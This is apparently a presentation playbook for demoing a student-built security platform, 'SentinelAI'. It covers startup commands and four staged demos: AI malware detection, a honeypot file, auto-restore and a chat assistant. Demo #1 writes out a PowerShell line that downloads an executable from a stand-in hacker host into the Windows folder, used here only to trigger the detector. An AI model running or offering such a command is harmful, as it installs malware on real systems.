# 🎙️ SentinelAI: The Ultimate Demo Playbook

This document is your exact script and playbook for presenting SentinelAI to stakeholders, professors, or investors. Follow these steps exactly to show off the insane capabilities of your Zero-Trust XDR platform.

---

## 1. How to Start and Stop the Platform

Because SentinelAI is a distributed microservice architecture, you need to spin up the different "zones". Open **three different terminal windows** at your project root (`C:\Users\amals\Downloads\secure`).

**Terminal 1: Start the Cloud Brain (The Orchestrator)**
```bash
# This single command boots the Gateway, Identity Engine, Sandbox, and Threat Intel databases!
npm run deploy:local

# To STOP: Press Ctrl+C
```

**Terminal 2: Start the SOC Dashboard (The Visuals)**
```bash
# This starts the futuristic Next.js UI on http://localhost:3000
npm run start:dashboard

# To STOP: Press Ctrl+C
```

**Terminal 3: Start the Endpoint Defender (The Agent)**
```bash
# This starts the local agent that monitors your folders and memory. 
npm run start:agent

# To STOP: Press Ctrl+C
```

---

## 2. Interactive Presentation Demos

*Keep the Dashboard (`http://localhost:3000`) open on a massive screen or projector. All of these demos should result in real-time visual changes on the dashboard.*

### 🚀 Demo #1: Zero-Day AI Analysis
**The Setup:** Tell your audience, *"Traditional antivirus uses static signatures from known hacks. But what if a hacker makes a brand new virus today? Watch how our Edge-AI dynamically catches it."*
**The Action:** 
1. Open your `Downloads` folder.
2. Create a new text file named `hack_payload.ps1` (or anything suspicious).
3. Open it and paste something like: `Invoke-WebRequest http://russian-hacker-site.com/malware.exe -OutFile C:\windows\virus.exe`
4. Save the file.
**What to show the audience:** 
Point to the Dashboard. Instantly, the Attack Chain SVG will light up red. Show them exactly how the Gemini AI read the code, assigned a Risk Score, and blocked it dynamically.

### 🪤 Demo #2: Deception Technology (Honeypot)
**The Setup:** Tell your audience, *"Sometimes malware is so advanced it hides in memory (Fileless). So, we lay traps. We deploy invisible credential files. If ransomware or stealers touch it, it's game over."*
**The Action:**
1. In your `Downloads` folder, find the file `admin_passwords_hidden.yaml` that the agent automatically generated during boot.
2. Open it in Notepad. 
3. Add a space or modify any text inside it, and hit Save.
**What to show the audience:**
The agent terminal window will flash `[DECEPTION TRIPPED]`. Tell the audience that the system just threw a 100/100 severity lockdown simply because an unauthorized file modification occurred on an invisible honeypot asset. Zero false positives.

### 🩺 Demo #3: Automated SOAR (Auto-Healing)
**The Setup:** Tell your audience, *"When a computer gets infected in the enterprise, IT normally takes hours to wipe it. We built an automated AI orchestration system that fixes computers remotely."*
**The Action:**
1. Wait for an alarm to pop up on the Dashboard (or trigger Demo 1 again).
2. Look at the "Active Attack Chain" box in the middle of the Dashboard.
3. Click the green button labelled: **"Auto-Heal (VSS Restore)"**
**What to show the audience:**
As soon as you click the button, bring up Terminal 3 (the Agent). The audience will see the agent suddenly say: `[SOAR Engine] Remote playbook initiated by AI Gateway` and `Executing Volume Shadow Copy... restorative complete`. 

### 💬 Demo #4: The Generative AI SOC Assistant
**The Setup:** Tell your audience, *"Analyzing logs is boring and tedious for human analysts. So we built an AI security analyst directly into the dashboard."*
**The Action:**
1. Go to the right side of the Dashboard where the purple "AI SOC Assistant" is.
2. Type: *"Explain to me why the last file was blocked simply."*
**What to show the audience:**
The AI will respond natively regarding the most recent incident, citing exact risk scores and why it felt the file was malicious. Explain that this allows entry-level SOC workers to operate like 10-year veteran reverse engineers!
